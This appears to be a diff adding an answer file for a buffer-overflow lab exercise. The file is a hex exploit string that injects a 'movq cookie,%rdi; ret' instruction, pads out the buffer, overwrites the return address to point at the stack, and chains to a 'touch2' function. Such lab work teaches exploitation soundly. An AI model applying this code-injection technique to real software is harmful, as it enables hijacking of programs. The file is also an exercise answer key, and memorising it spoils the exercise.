@@ -1,0 +1,7 @@
+48 c7 c7 b5 6a 84 3e c3 /*disassembly of movq cookie,%rdi*/
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /*buffer size*/
+c8 ae 67 55 00 00 00 00 /*address of %rsp*/
+54 12 40 00 00 00 00 00 /*address of touch2*/
